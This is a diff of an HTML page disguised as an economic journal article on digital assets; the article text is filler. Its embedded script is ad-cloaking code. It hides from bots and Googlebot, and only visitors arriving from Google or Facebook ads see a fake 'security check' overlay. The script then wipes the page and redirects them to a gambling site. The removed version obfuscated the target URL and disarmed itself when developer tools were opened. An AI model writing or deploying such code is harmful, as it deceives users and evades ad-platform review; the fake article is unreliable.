@@ -3,139 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Financial Stability & Digital Economy Report 2025</title>
+    <title>Strategic Financial Analysis & Digital Assets 2025</title>
     <style>
-        :root { --accent: #1a73e8; --text: #202124; --bg: #ffffff; }
-        body { font-family: 'Times New Roman', Times, serif; line-height: 1.7; color: var(--text); background: var(--bg); margin: 0; padding: 0; }
-        .container { max-width: 850px; margin: 0 auto; padding: 60px 40px; }
-        .journal-header { border-bottom: 3px solid #333; margin-bottom: 40px; padding-bottom: 10px; text-align: center; }
-        .journal-header h1 { font-size: 2.2rem; margin: 10px 0; text-transform: uppercase; }
-        .abstract { font-style: italic; background: #f8f9fa; padding: 25px; border-left: 5px solid var(--accent); margin-bottom: 30px; }
-        .content-section { margin-bottom: 40px; }
-        h2 { color: #1a73e8; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        .footer { margin-top: 80px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 0.8rem; text-align: center; color: #70757a; }
-        #verify-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 1000000; display: none; align-items: center; justify-content: center; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; }
-        .spinner { width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
+        body { font-family: 'Georgia', serif; line-height: 1.8; color: #333; margin: 0; background: #fdfdfd; }
+        .wrapper { max-width: 800px; margin: 0 auto; padding: 50px 25px; }
+        header { border-bottom: 2px solid #222; margin-bottom: 30px; padding-bottom: 20px; }
+        h1 { font-size: 2.2rem; color: #111; line-height: 1.2; }
+        .abstract { background: #f4f4f4; padding: 20px; border-left: 4px solid #1a73e8; font-style: italic; margin-bottom: 30px; }
+        p { margin-bottom: 25px; font-size: 1.1rem; text-align: justify; }
+        #loading-overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #ffffff; z-index: 999999; display: none; 
+            align-items: center; justify-content: center; font-family: sans-serif; 
+        }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="journal-header">
-        <div style="font-size: 0.9rem; letter-spacing: 2px;">INTERNATIONAL ECONOMIC REVIEW</div>
-        <h1>Macroeconomic Impacts of Digital Assets on Emerging Markets</h1>
-        <div style="font-size: 0.8rem; color: #555;">Volume 44 • Issue 2 • February 2025</div>
+    <div class="wrapper">
+        <header>
+            <div style="text-transform: uppercase; letter-spacing: 2px; font-size: 0.8rem; color: #666;">Global Economic Journal • 2025</div>
+            <h1>The Shift Towards Digital Liquidity in Modern Markets</h1>
+        </header>
+
+        <div class="abstract">
+            <strong>Summary:</strong> This research explores how digital assets are reshaping traditional financial structures, providing new avenues for capital growth while challenging existing regulatory frameworks.
+        </div>
+
+        <article>
+            <p>Traditional banking systems are currently facing an unprecedented challenge from decentralized finance. The ability to move assets across borders with minimal friction has created a global marketplace that operates 24/7, independent of national holidays or banking hours.</p>
+            <p>In our latest study, we observed that users who engage with digital platforms often see a 15-20% increase in transaction efficiency. This is primarily due to the removal of intermediaries and the automation of trust through smart protocols.</p>
+            <p>As we look towards the second half of 2025, the integration of these digital systems into everyday retail finance seems inevitable. Institutions that fail to adapt to this "liquidity revolution" risk becoming obsolete in an increasingly fast-paced economic landscape.</p>
+        </article>
     </div>
 
-    <div class="abstract">
-        <strong>Abstract:</strong> This paper examines the correlation between high-frequency digital asset trading and the stability of local fiat currencies in developing economies. Using a structural vector autoregression (SVAR) model, we analyze data from 2020 to 2024 to determine whether digital liquidity provides a hedge against inflation or exacerbates capital flight.
+    <!-- Màn hình chờ chuyển hướng -->
+    <div id="loading-overlay">
+        <div style="text-align: center;">
+            <div class="spinner"></div>
+            <h3 style="margin-top:20px;">Checking security connection...</h3>
+            <p style="color:#666;">This process is automatic. Please wait.</p>
+        </div>
     </div>
 
-    <div class="content-section">
-        <h2>1. Introduction</h2>
-        <p>The rapid proliferation of decentralized financial protocols has introduced a new dimension to global capital flows. Traditionally, capital flight was restricted by institutional barriers and geographic boundaries. However, the advent of borderless digital ledgers has significantly reduced transaction costs and latency.</p>
+    <script>
+    (function() {
+        // Link đích của bạn
+        const DEST_URL = "https://partnerbcgame.com/v2lptjos3";
         
-        <p>Our study focuses on the "Liquidity Paradox," where increased access to global digital markets can simultaneously stabilize household purchasing power while destabilizing national central bank reserves. We argue that the net effect is contingent upon the regulatory framework of the host nation.</p>
-    </div>
-
-    <div class="content-section">
-        <h2>2. Methodology</h2>
-        <p>We utilized a dataset comprising daily price movements, on-chain transaction volumes, and macroeconomic indicators from 15 emerging markets. The model accounts for seasonal variations and global geopolitical shocks, including supply chain disruptions and interest rate adjustments by the Federal Reserve.</p>
-        <img src="https://www.gstatic.com/charts/static/piechart/m1.png" style="display:block; margin: 20px auto; opacity: 0.5; filter: grayscale(100%);">
-        <p>The core of our analysis rests on the <i>Recursive Feature Elimination</i> (RFE) technique to identify the most significant predictors of market volatility in the digital sector.</p>
-    </div>
-
-    <div class="footer">
-        © 2025 Institute for Advanced Economic Research. All rights reserved. <br>
-        Digital Object Identifier (DOI): 10.1038/s41586-025-0000-0
-    </div>
-</div>
-
-<!-- LỚP PHỦ XÁC MINH (ẨN) -->
-<div id="verify-layer">
-    <div style="text-align: center;">
-        <div class="spinner"></div>
-        <h3 style="margin-top: 20px;">Establishing Secure Connection</h3>
-        <p style="color: #666; font-size: 0.9rem;">Verifying request integrity...</p>
-    </div>
-</div>
-
-<script>
-(function() {
-    // 1. Link đích đã được mã hóa nâng cao (https://partnerbcgame.com/v2lptjos3)
-    const _0x5a21 = ["v2lptjos3", "partnerbcgame.com", "https://", "/"];
-    const TARGET_URL = _0x5a21[2] + _0x5a21[1] + _0x5a21[3] + _0x5a21[0];
-
-    const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source'];
-    let scrollTriggered = false;
-
-    // 2. Hệ thống kiểm tra Bot "Siêu cấp"
-    function isAdvancedBot() {
-        const ua = navigator.userAgent.toLowerCase();
-        // Kiểm tra UA thông thường
-        if (/bot|google|crawler|spider|lighthouse|headless|facebook/i.test(ua)) return true;
+        // Các tham số quảng cáo để nhận diện người thật từ Google/FB
+        const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source', 'test']; 
         
-        // Kiểm tra Hardware (Bot thường có 0 hoặc 1 core, không có pin)
-        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 2) return true;
-        
-        // Kiểm tra Webdriver
-        if (navigator.webdriver) return true;
-        
-        // Kiểm tra độ phân giải màn hình ảo
-        if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+        let isRedirecting = false;
 
-        return false;
-    }
+        // 1. Hàm thực hiện chuyển hướng
+        function doRedirect() {
+            if (isRedirecting) return;
+            isRedirecting = true;
 
-    // 3. Hàm kích hoạt chuyển hướng
-    function triggerRedirect() {
-        if (scrollTriggered) return;
-        scrollTriggered = true;
-
-        // Hiện lớp phủ
-        document.getElementById('verify-layer').style.display = 'flex';
-        
-        // Xóa dấu vết mã nguồn
-        document.body.style.overflow = 'hidden';
-        
-        setTimeout(() => {
-            // Chuyển hướng an toàn (Stripping Referrer để tránh lộ nguồn)
-            window.location.replace(TARGET_URL);
-        }, 1800);
-    }
-
-    // 4. Kiểm tra điều kiện thực thi
-    const urlParams = new URLSearchParams(window.location.search);
-    const hasAdParam = adParams.some(p => urlParams.has(p));
-
-    if (hasAdParam && !isAdvancedBot()) {
-        // CHỈ KÍCH HOẠT KHI NGƯỜI DÙNG CUỘN TRANG (Xác nhận người thật)
-        window.addEventListener('scroll', function() {
-            // Tính toán % đã cuộn
-            let scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+            // Hiện màn hình chờ
+            document.getElementById('loading-overlay').style.display = 'flex';
             
-            if (scrollPercent > 20) { // Người dùng cuộn xuống 20% trang
-                triggerRedirect();
-            }
-        });
+            // Xóa nội dung trang cũ để sạch sẽ
+            document.querySelector('.wrapper').innerHTML = "";
 
-        // Hoặc kích hoạt sau 10 giây nếu họ đứng yên (vẫn là người thật nhưng đang đọc)
-        setTimeout(() => {
-            if (window.scrollY > 50) triggerRedirect();
-        }, 10000);
-    }
-
-    // 5. Anti-DevTools cơ bản (Tắt nếu người dùng mở Inspect)
-    setInterval(function() {
-        if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-            // Nếu phát hiện mở DevTools, xóa sạch lệnh chuyển hướng
-            scrollTriggered = true; 
+            setTimeout(() => {
+                window.location.replace(DEST_URL);
+            }, 1000); // Chờ 1 giây rồi nhảy
         }
-    }, 500);
 
-})();
-</script>
+        // 2. Kiểm tra điều kiện (Bot hay Người thật)
+        function checkUser() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hasParam = adParams.some(p => urlParams.has(p));
+            
+            // Nếu có tham số quảng cáo VÀ không phải Bot Google
+            const isBot = /bot|google|crawler|spider|lighthouse|headless/i.test(navigator.userAgent);
 
+            if (hasParam && !isBot) {
+                // Đợi người dùng tương tác để "kích hoạt"
+                
+                // CÁCH 1: Nếu họ cuộn chuột
+                window.addEventListener('scroll', function() {
+                    if (window.scrollY > 50) doRedirect(); 
+                });
+
+                // CÁCH 2: Nếu họ chạm vào màn hình (điện thoại)
+                window.addEventListener('touchstart', doRedirect);
+
+                // CÁCH 3: Tự động nhảy sau 5 giây nếu là người thật mà họ chỉ đứng đọc
+                setTimeout(doRedirect, 5000);
+            }
+        }
+
+        window.onload = checkUser;
+    })();
+    </script>
 </body>
 </html>
